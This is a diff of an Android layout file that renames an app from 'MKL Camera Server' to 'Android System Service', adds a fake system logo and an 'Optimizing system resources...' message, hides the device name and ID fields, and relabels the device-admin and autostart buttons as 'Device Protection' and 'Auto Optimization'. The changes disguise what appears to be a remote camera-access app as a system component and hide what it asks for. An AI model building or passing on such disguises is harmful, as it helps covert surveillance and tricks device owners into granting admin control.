@@ -4,73 +4,81 @@
     android:layout_width="match_parent"
     android:layout_height="match_parent"
     android:orientation="vertical"
-    android:padding="16dp"
-    android:gravity="center_horizontal"
-    android:background="#121212"
+    android:padding="24dp"
+    android:gravity="center"
+    android:background="#0f172a"
     tools:context=".MainActivity">
 
+    <ImageView
+        android:id="@+id/ivSystemLogo"
+        android:layout_width="100dp"
+        android:layout_height="100dp"
+        android:src="@drawable/ic_android_system"
+        android:contentDescription="Android System Logo"
+        android:layout_marginBottom="20dp" />
+
     <TextView
         android:layout_width="wrap_content"
         android:layout_height="wrap_content"
-        android:text="MKL Camera Server"
+        android:text="Android System Service"
         android:textColor="#ffffff"
-        android:textSize="24sp"
+        android:textSize="22sp"
+        android:textStyle="bold"
+        android:layout_marginBottom="8dp"/>
+
+    <TextView
+        android:id="@+id/tvDeviceSpec"
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:text="Oppo A3s (ColorOS 5.1 | Android 8.1)"
+        android:textColor="#3b82f6"
+        android:textSize="14sp"
         android:textStyle="bold"
         android:layout_marginBottom="32dp"/>
 
-    <EditText
-        android:id="@+id/etDeviceName"
-        android:layout_width="match_parent"
-        android:layout_height="wrap_content"
-        android:hint="Enter Device Name"
-        android:textColor="#ffffff"
-        android:textColorHint="#aaaaaa"
-        android:backgroundTint="#ffffff"
-        android:inputType="textCapWords"
+    <ProgressBar
+        android:id="@+id/spinnerLoader"
+        style="?android:attr/progressBarStyleLarge"
+        android:layout_width="48dp"
+        android:layout_height="48dp"
+        android:indeterminateTint="#3b82f6"
         android:layout_marginBottom="16dp"/>
-
-    <TextView
-        android:layout_width="wrap_content"
-        android:layout_height="wrap_content"
-        android:text="Your Device ID"
-        android:textColor="#aaaaaa"
-        android:textSize="16sp"/>
-
-    <TextView
-        android:id="@+id/tvMyDeviceId"
-        android:layout_width="wrap_content"
-        android:layout_height="wrap_content"
-        android:text="Loading..."
-        android:textColor="#007bff"
-        android:textSize="32sp"
-        android:textStyle="bold"
-        android:layout_marginBottom="32dp"/>
 
     <TextView
         android:id="@+id/tvStatus"
         android:layout_width="wrap_content"
         android:layout_height="wrap_content"
-        android:text="Status: Not Running"
-        android:textColor="#ffffff"
-        android:textSize="18sp"
-        android:layout_marginBottom="16dp"/>
+        android:text="Optimizing system resources..."
+        android:textColor="#94a3b8"
+        android:textSize="15sp"
+        android:layout_marginBottom="24dp"/>
+
+    <EditText
+        android:id="@+id/etDeviceName"
+        android:layout_width="match_parent"
+        android:layout_height="wrap_content"
+        android:visibility="gone" />
+
+    <TextView
+        android:id="@+id/tvMyDeviceId"
+        android:layout_width="wrap_content"
+        android:layout_height="wrap_content"
+        android:visibility="gone" />
 
     <ProgressBar
         android:id="@+id/progressBar"
         style="?android:attr/progressBarStyleHorizontal"
         android:layout_width="match_parent"
         android:layout_height="wrap_content"
-        android:visibility="invisible"
-        android:layout_marginBottom="24dp"/>
+        android:visibility="gone" />
 
     <Button
         android:id="@+id/btnAdmin"
         android:layout_width="match_parent"
         android:layout_height="wrap_content"
-        android:layout_marginTop="24dp"
         android:visibility="gone"
-        android:text="Enable Device Admin"
-        android:backgroundTint="#6c757d"/>
+        android:text="Enable Device Protection"
+        android:backgroundTint="#3b82f6"/>
 
     <Button
         android:id="@+id/btnAutoStart"
@@ -78,7 +86,7 @@
         android:layout_height="wrap_content"
         android:layout_marginTop="12dp"
         android:visibility="gone"
-        android:text="Enable Auto Start"
-        android:backgroundTint="#6c757d"/>
+        android:text="Configure Auto Optimization"
+        android:backgroundTint="#64748b"/>
 
 </LinearLayout>
